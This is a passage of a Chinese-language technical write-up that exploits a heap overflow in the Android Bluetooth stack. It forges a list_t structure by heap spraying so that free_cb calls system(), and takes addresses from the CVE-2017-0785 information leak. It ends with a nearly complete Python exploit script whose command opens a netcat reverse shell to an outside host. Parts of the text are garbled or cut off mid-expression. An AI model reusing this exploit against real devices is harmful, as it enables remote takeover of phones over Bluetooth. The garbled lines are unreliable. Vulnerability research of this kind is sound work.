那么我们的一种漏洞利用思路就有了，就是首先通过堆喷覆盖`fixed\_queue\_t`前8个字节，控制 list
指针指向我们伪造的`list\_t`结构体，从而控制`free\_cb`的值，达到劫持pc的目的。当我们伪造的`free\_cb`被调用的时候，那么进程的执行就会被我们控制。我们通过查看`bt/osi/src`下的源文件发现`free\_cb`会在`list\_free\_node\_`函数中被调用：
        static list_node_t* list_free_node_(list_t* list, list_node_t* node) {
          CHECK(list != NULL);
          CHECK(node != NULL);
          list_node_t* next = node->next;
          if (list->free_cb) list->free_cb(node->data);
          list->allocator->free(node);
          --list->length;
          return next;
        }
我们继续查看调用，找到了一条触发的调用链：
    fixed_queue_try_enqueue-->list_remove-->list_freenode->free_cb
而`fixed\_queue\_try\_enqueue`会在蓝牙栈的协议处理时用到，所以只要我们能控制`list_t`结构体，就能劫持蓝牙进程的执行。
接下来我们需要找到伪造`list_t`结构体的办法。我们首先可以假设我们通过大量堆喷，在堆中放置了很多我们伪造的`list_t`结构体，并且通过堆喷使得某已知堆地址addr_A恰好放置了我们伪造的一个`list_t`结构体，那么我们只需再通过堆喷来覆盖`fixed_queue_t`结构体的前8个字节，包内容如下所示：
    pkt = '\x81\x01\x00'+ struct.pack('head->data`，因此我们只要构造好该参数即可。最终构造好的结构如下所示：
为了防止进程意外崩溃，我们还原了`list\_t`结构体中的`allocator\_t`结构体，包含了`osi`中堆分配和回收的函数地址。这里用到的3个函数地址`system`、`osi\_alloc`、`osi\_free`都可以通过`CVE-2017-0785`的信息泄露漏洞获取到。
通过以上分析，我们可以得到第一次堆喷所发送的数据包内容：
    pkt = '\x81\x01\x00'+  p32(addr_A+0x20 )2 + '\x01\x00\x00\x00' + p32(system_addr) + p32(addr_A + 0x14) + p32(osi_alloc_addr) + p32(osi_free_addr)+ '\x00'8 + p32(addr_A+0x28) + cmd_str + '\x00'*(48-len(cmd_str))
综上所述，我们可以得到 exploit 脚本：
        from pwn import *
        import bluetooth,time
        addr_A = 0xe6792a00 + 8
        cmd_str = "busybox nc 192.168.2.1 8088 -e /system/bin/sh &" + '\x00'
        libc_base = 0xf34cf000
        system_addr = libc_base + 0x64a30 + 1
        bluetooth_base_addr = 0xeb901000
        osi_alloc_addr = bluetooth_base_addr + 0x15b885
        osi_free_addr = bluetooth_base_addr + 0x15b8e5
        pkt1 = '\x81\x01\x00'+  p32(addr_A+0x20)*2 + '\x01\x00\x00\x00' + p32(system_addr) + p32(addr_A+0x14) + p32(osi_alloc_addr) + p32(osi_free_addr)+ '\x00'*8 + p32(addr_A+0x28) + cmd_str + '\x00'*(48-len(cmd_str)) 
        pkt2 = '\x81\x01\x00'+ p32(addr_A) * 8
        def heap_spray():
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.connect((target, 0xf))
            for i in range(500):
                sock.send(pkt1)
                data = sock.recv(1024)
            sock.close()
        def heap_overflow():
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.connect((target, 0xf))
            for i in range(3000):
                sock.send(pkt2)
                data = sock.recv(1024)
            sock.close()
        if __name__ == "__main__":
             if len(sys.argv) 
[2] 
* * *